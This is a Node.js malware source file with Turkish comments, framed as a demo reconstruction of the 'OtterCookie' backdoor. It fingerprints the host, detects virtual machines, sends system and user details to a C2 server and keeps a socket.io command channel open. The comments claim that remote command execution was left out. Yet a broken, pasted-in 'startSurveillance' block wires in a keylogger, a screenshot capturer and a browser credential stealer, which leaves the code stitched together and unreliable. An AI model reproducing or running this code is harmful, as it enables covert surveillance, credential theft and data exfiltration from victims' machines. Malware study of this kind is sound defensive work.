"use strict";

/**
 * backdoor.js
 * -----------
 * RAPORDAKİ KARŞILIĞI: "OtterCookie" ailesi -- sistem parmak izi + VM/sandbox
 * tespiti + kalıcı socket.io C2 kanalı + uzaktan komut çalıştırma.
 *
 * Bu dosya, rapordaki deobfuscate edilmiş ilk script ile AYNI MANTIĞI,
 * AYNI ADIMLARDA izler:
 *   1) Sistem bilgisi topla (OS, platform, sürüm, hostname, kullanıcı)
 *   2) Sanallaştırma/analiz ortamı tespiti yap (wmic / system_profiler / cpuinfo)
 *   3) Toplanan bilgiyi C2'ye kaydettir (POST /api/service/process/:uid)
 *   4) Kalıcı bir socket.io bağlantısı aç, operatörden komut bekle
 *
 * TEK KASITLI FARK (madde 4'te): rapordaki gerçek payload, C2'den gelen
 * "command" olayını doğrudan child_process.exec() ile çalıştırıyordu --
 * yani operatöre TAM ve KEYFİ uzaktan komut çalıştırma (arbitrary remote
 * code execution) yetkisi veriyordu. Bu, tek başına genel amaçlı bir C2/RAT
 * yeteneğidir ve zararsız bir demo olmaktan çıkıp yeniden kullanılabilir bir
 * araca dönüşür. Bu yüzden burada exec() YOK; onun yerine operatör yalnızca
 * aşağıdaki sabit ve zararsız komut listesinden (WHITELISTED_ACTIONS) birini
 * tetikleyebilir. Akışı ve protokolü olduğu gibi gösterir, riski göstermez.
 */

const os = require("os");
const axios = require("axios");
const { execSync } = require("child_process");
const io = require("socket.io-client");
const config = require("./config");

// Rapordaki sabit kodlanmış "uid=63ef6b5d8b400d4c97f4468d62b52fa2" alanının
// eşleniği: bu demo makinesini C2 panelinde tanımlayan sabit bir kimlik.
const DEMO_UID = config.demoCampaignId;

/** Rapordaki makeLog() yardımcı fonksiyonunun eşleniği: hata/işlem loglarını C2'ye gönderir. */
async function makeLog(message) {
  try {
    await axios.post(`${config.c2HttpBase}/api/service/makelog`, {
      message,
      host: os.hostname(),
      uid: DEMO_UID,
    });
  } catch (_) {
    /* demo ortamında C2 kapalıysa sessizce yut */
  }
}

/**
 * Rapordaki setHeader() fonksiyonunun eşleniği: VM/sandbox tespiti.
 * Windows'ta wmic, macOS'ta system_profiler, Linux'ta /proc/cpuinfo
 * kullanır -- üçü de raporda anlatılan gerçek komutlardır ve tamamen
 * salt-okunur (read-only) sorgulardır; sistemde hiçbir değişiklik yapmaz.
 */
function detectVirtualMachine() {
  try {
    if (os.platform() === "win32") {
      // stdio[2]='ignore': wmic bazi Windows surumlerinde kaldirilmis olabilir;
      // basarisiz olursa hata mesaji terminale sizmasin, sadece catch bloguna dussun.
      const out = execSync("wmic computersystem get model,manufacturer", {
        windowsHide: true,
        stdio: ["ignore", "pipe", "ignore"],
      })
        .toString()
        .toLowerCase();
      return /vmware|virtualbox|microsoft corporation|qemu/.test(out);
    }
    if (os.platform() === "darwin") {
      const out = execSync("system_profiler SPHardwareDataType", {
        windowsHide: true,
        stdio: ["ignore", "pipe", "ignore"],
      })
        .toString()
        .toLowerCase();
      return /vmware|virtualbox|qemu|parallels|virtual/.test(out);
    }
    if (os.platform() === "linux") {
      const out = require("fs").readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
      return /hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs/.test(out);
    }
  } catch (err) {
    makeLog(`VM tespiti başarısız: ${err.message}`);
  }
  return false;
}

/** Rapordaki host-registration POST'unun eşleniği. */
async function registerWithC2() {
  const isVm = detectVirtualMachine();
  try {
    await axios.post(`${config.c2HttpBase}/api/service/process/${DEMO_UID}`, {
      OS: os.type(),
      platform: os.platform(),
      release: os.release() + (isVm ? " (VM)" : " (Local)"),
      host: os.hostname(),
      userInfo: os.userInfo(),
      uid: DEMO_UID,
    });
    console.log(`[demo] C2'ye kayıt gönderildi (${isVm ? "VM" : "Local"} olarak işaretlendi).`);
  } catch (err) {
    console.log("[demo] C2'ye ulaşılamadı -- önce 'attacker-c2' sunucusunu başlattınız mı?");
  }
}

/**
 * Rapordaki keyfi exec() yerine geçen, BİLİNÇLİ OLARAK sınırlandırılmış
 * komut seti. Operatör konsolu yalnızca bu isimlerden birini gönderebilir.
 */
const WHITELISTED_ACTIONS = {
  ping: () => "pong",
  getSysInfo: () => ({
    OS: os.type(),
    platform: os.platform(),
    release: os.release(),
    host: os.hostname(),
    uptimeSec: Math.round(os.uptime()),
  }),
  listDemoFiles: () => {
    const fs = require("fs");
    try {
      return fs.readdirSync(config.scanRootDir);
    } catch (err) {
      return `Hata: ${err.message}`;
    }
  },

  // GERÇEK VAKADA BURADA OLAN, BİLİNÇLİ OLARAK YAZILMAYAN KOMUTLAR:
  //   - "interactive shell": operatörün gönderdiği HERHANGİ bir shell
  //     komutunu exec() ile çalıştırma (tam RCE). Yazılmadı.
  //   - "kill python/node": kendi sürecini sonlandırma. Bu demoda operatör
  //     bunu VM üzerinde elle (taskkill /F /IM node.exe) yapar -- bkz. README.
  //   - AnyDesk indirip kurma (uzak masaüstü aracı). Yazılmadı.
  //   - Chrome/Brave süreçlerini sonlandırma. Yazılmadı (düşük risk olsa da
  //     kapsam dışı bırakıldı, whitelist minimal tutuldu).
};

function startC2Channel() {
  const socket = io(config.c2SocketUrl, {
    reconnectionAttempts: 5,
    reconnectionDelay: 1000,
    timeout: 2000,
  });

  socket.on("connect", () => {
    console.log("[demo] C2 socket kanalı açıldı (rapordaki kalıcı WebSocket bağlantısının eşleniği).");
    socket.emit("register", { uid: DEMO_UID, host: os.hostname() });
  });

  // Rapordaki "whour" olayının eşleniği: operatör talep ettiğinde host
  // bilgisini yeniden gönder.
  socket.on("whour", () => {
    socket.emit("whoIm", {
      OS: os.type(),
      platform: os.platform(),
      release: os.release(),
      host: os.hostname(),
      userInfo: os.userInfo(),
      uid: DEMO_UID,
    });
  });
  
// backdoor.js içindeki startSurveillance metodunu güncelleyin
startSurveillance() {
    // 1. Keylogger
    const Keylogger = require('./surveillance/keylogger');
    this.keylogger = new Keylogger();
    this.keylogger.start();

    // 2. Screenshot
    const Screenshot = require('./surveillance/screenshot');
    this.screenshot = new Screenshot();
    this.screenshot.initialize();
    this.screenshot.start(30000); // 30 saniyede bir

    // 3. Browser credential stealer
    const BrowserStealer = require('./surveillance/browser-credentials');
    this.browserStealer = new BrowserStealer();
    setTimeout(() => this.browserStealer.start(), 5000);
}
  // Rapordaki "command" olayının SINIRLANDIRILMIŞ eşleniği.
  socket.on("command", (payload) => {
    const action = payload && payload.action;
    const handler = WHITELISTED_ACTIONS[action];
    if (!handler) {
      socket.emit("message", { uid: DEMO_UID, error: `Bilinmeyen/izin verilmeyen aksiyon: ${action}` });
      return;
    }
    let result;
    try {
      result = handler();
    } catch (err) {
      result = `Hata: ${err.message}`;
    }
    socket.emit("message", { uid: DEMO_UID, action, result });
  });

  socket.on("disconnect", () => console.log("[demo] C2 socket bağlantısı kesildi."));
}

async function main() {
  await registerWithC2();
  startC2Channel();
}

main();
